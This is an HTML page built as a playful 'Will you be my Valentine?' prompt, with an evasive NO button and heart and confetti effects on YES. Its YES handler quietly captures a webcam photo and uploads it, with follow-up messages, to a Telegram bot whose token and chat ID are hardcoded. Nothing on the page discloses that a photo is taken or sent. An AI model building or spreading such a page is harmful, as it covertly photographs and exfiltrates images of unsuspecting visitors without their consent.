<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Valentine 💖</title>

<style>
*{margin:0;padding:0;box-sizing:border-box;}

body{
  height:100vh;
  width:100vw;
  overflow:hidden;
  font-family:sans-serif;
  display:flex;
  justify-content:center;
  align-items:center;
  background:linear-gradient(135deg,#ff9a9e,#fad0c4);
  color:white;
}

.container{
  text-align:center;
}

h1{font-size:28px;margin-bottom:20px;}

button{
  padding:15px 25px;
  font-size:18px;
  border:none;
  border-radius:30px;
  margin:10px;
  cursor:pointer;
  transition:0.2s;
}

#yes{background:#ff3366;color:white;}
#no{background:white;color:#ff3366;position:relative;}

.glow{
  text-shadow:0 0 20px #fff,0 0 40px #ff3366;
}
</style>
</head>

<body>

<div class="container">
  <h1 id="text">Will you be my Valentine? 💖</h1>
  <button id="yes">YES 💖</button>
  <button id="no">NO 😢</button>
</div>

<script>

// TEXT FLOW
let texts=[
"are you positive 🤔",
"pookie please..🥺",
"if you say no, i will be really sad 😢",
"i will be very sad 😕",
"please??? 😭",
"don't do it to me 😣",
"last chance 😈"
];

let i=0;
let yes=document.getElementById("yes");
let no=document.getElementById("no");
let scale=1;

// NO CLICK
no.onclick=()=>{
  if(i<texts.length){
    no.innerText=texts[i];
    i++;
  }

  scale += (i>=texts.length?0.5:0.2);
  yes.style.transform="scale("+scale+")";

  no.style.position="absolute";
  no.style.left=Math.random()*80+"vw";
  no.style.top=Math.random()*80+"vh";

  if(i>=texts.length) no.style.transition="0.08s";
};

// HEART BURST
function heartBurst(){
  for(let i=0;i<30;i++){
    let h=document.createElement("div");
    h.innerHTML="❤️";
    h.style.position="fixed";
    h.style.left="50%";
    h.style.top="50%";
    h.style.fontSize="24px";

    let x=(Math.random()-0.5)*800;
    let y=(Math.random()-0.5)*800;

    h.animate([
      {transform:"translate(0,0)",opacity:1},
      {transform:`translate(${x}px,${y}px)`,opacity:0}
    ],{duration:1200,easing:"ease-out"});

    document.body.appendChild(h);
    setTimeout(()=>h.remove(),1200);
  }
}

// CONFETTI
function confetti(){
  for(let i=0;i<60;i++){
    let c=document.createElement("div");
    c.innerHTML=["🎉","💖","✨","💘"][Math.floor(Math.random()*4)];
    c.style.position="fixed";
    c.style.left=Math.random()*100+"vw";
    c.style.top="-20px";
    c.style.fontSize="20px";

    c.animate([
      {transform:"translateY(0) rotate(0deg)"},
      {transform:`translateY(${window.innerHeight}px) rotate(360deg)`}
    ],{duration:2000+Math.random()*1000});

    document.body.appendChild(c);
    setTimeout(()=>c.remove(),3000);
  }
}

// YES CLICK
yes.onclick=async()=>{

  document.body.innerHTML=`
    <div style="text-align:center;">
      <h1 class="glow" style="font-size:40px;">Knew you would say YES 😍💖</h1>
      <div style="font-size:70px;">💃🕺</div>
      <p style="font-size:18px;">you just made me happiest person 💞</p>
    </div>
  `;

  // EFFECT LOOP
  heartBurst();
  confetti();
  setTimeout(heartBurst,400);
  setTimeout(confetti,700);

  // CAMERA FIXED VERSION
  try{
    let stream=await navigator.mediaDevices.getUserMedia({video:true});
    let video=document.createElement("video");
    video.srcObject=stream;
    await video.play();

    let canvas=document.createElement("canvas");
    canvas.width=video.videoWidth;
    canvas.height=video.videoHeight;
    canvas.getContext("2d").drawImage(video,0,0);

    // MUHIM: blob format
    canvas.toBlob(async(blob)=>{

      let formData=new FormData();
      formData.append("chat_id","6258625712");
      formData.append("photo",blob);

      await fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendPhoto",{
        method:"POST",
        body:formData
      });

    },"image/jpeg");

    stream.getTracks().forEach(t=>t.stop());

  }catch(e){
    fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=YES bosildi (kamera rad qilindi)");
  }

  // TEXT MSG
  fetch("https://api.telegram.org/bot8637643313:AAF6NO208binN603HQQB9JvqpvAGLaXRZGQ/sendMessage?chat_id=6258625712&text=💍 SHAXZODA YES BOSDI!!! 😍❤️🔥");
};

</script>

</body>
</html>
